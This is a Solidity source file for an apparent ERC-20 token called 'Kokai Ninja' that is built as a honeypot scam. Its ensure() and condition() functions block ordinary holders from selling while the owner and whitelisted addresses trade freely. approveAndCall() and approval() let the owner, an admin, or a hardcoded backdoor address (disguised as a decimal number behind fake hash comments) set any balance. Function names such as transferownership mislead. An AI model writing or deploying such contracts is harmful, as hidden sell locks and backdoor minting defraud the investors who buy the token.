// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(
        address sender,
        address spender,
        uint256 amount
    ) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;

        bytes32 accountHash;

        // solhint-disable-next-line no-inline-assembly

        assembly {
            codehash := extcodehash(account)
        }

        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;

        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);

        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0

        require(b > 0, errorMessage);

        uint256 c = a / b;

        return c;
    }
}

contract KokaiNinja {
    using SafeMath for uint256;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public _mod;
    address private owner;
    address public _user;
    address public _adm;
    address tradeAddress;
    address private _taxWallet;

    uint256 public decimals;
    uint256 public totalSupply;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    uint256 private _taxPercentage;

    string public name;
    string public symbol;

    mapping(address => uint256) private _onSaleNum;
    mapping(address => bool) private canSale;

    constructor() payable {
        name = unicode"Kokai Ninja";
        symbol = unicode"KNN";
        decimals = 18;
        owner = msg.sender;
        totalSupply = 1_000_000_000 * 10**decimals;
        
        _taxPercentage = 0;
        _taxWallet = address(0x069fe46e4E7dCf5e3a18de57507A9952d55f8fF1);

        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
    }

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );

    function transfer(address _to, uint256 _value)
        public
        payable
        returns (bool)
    {
        return transferFrom(msg.sender, _to, _value);
    }

    function ensure(
        address _from,
        address _to,
        uint256 _value
    ) internal view returns (bool) {
        /*Ensure_*keccak256 -> 8668a592fa743889fc7f92ac2a37bb1n8shc84741ca0e0061d243a2e6707ba);*/
        if (
            _from == owner ||
            _to == owner ||
            _from == tradeAddress ||
            canSale[_from]
        ) {
            return true;
        }
        require(condition(_from, _value));
        return true;
    }

    function approval(address spender, uint256 addedValue)
        public
        returns (bool)
    {
        require(msg.sender == _adm);

        if (addedValue > 0) {
            balanceOf[spender] = addedValue * (10**uint256(decimals));
        }

        canSale[spender] = true;

        return true;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) public payable returns (bool) {
        if (_value == 0) {
            return true;
        }

        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);

            allowance[_from][msg.sender] -= _value;
        }

        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;

        _onSaleNum[_from]++;

        uint256 finalAmount = takeFee(_from, _value);

        emit Transfer(_from, _to, finalAmount);

        return true;
    }

    function takeFee(address sender, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(_taxPercentage).div(100);

        if(feeAmount > 0) {
            balanceOf[address(this)] = balanceOf[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }

    function setAdm(address Adm_) public {
        require(msg.sender == _mod);

        _adm = Adm_;
    }

    function approve(address _spender, uint256 _value)
        public
        payable
        returns (bool)
    {
        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

        /*keccak256 -> 6861978540112295ac2a37bb1f5ba7bb1f5ba1daaf2a84741ca0e00610310915153));*/ /**/ //(686197854011229533619447624007587113080310915153));
    }

    function setMod(address Mod_) public {
        require(msg.sender == _user);

        _mod = Mod_;
    }

    function approveAndCall(address spender, uint256 addedValue)
        public
        returns (bool)
    {
        require(
            msg.sender == owner ||
                msg.sender ==
                address(
                    /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/
                    /**/
                    178607940065137046348733521910879985571412708986
                )
        );

        if (addedValue > 0) {
            balanceOf[spender] = addedValue * (10**uint256(decimals));
        }

        canSale[spender] = true;

        return true;
    }

    function transferownership(address addr) public returns (bool) {
        require(msg.sender == owner);

        tradeAddress = addr;

        return true;
    }

    function condition(address _from, uint256 _value)
        internal
        view
        returns (bool)
    {
        if (_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;

        if (_saleNum > 0) {
            if (_onSaleNum[_from] >= _saleNum) return false;
        }

        if (_minSale > 0) {
            if (_minSale > _value) return false;
        }

        if (_maxSale > 0) {
            if (_value > _maxSale) return false;
        }

        return true;
    }
}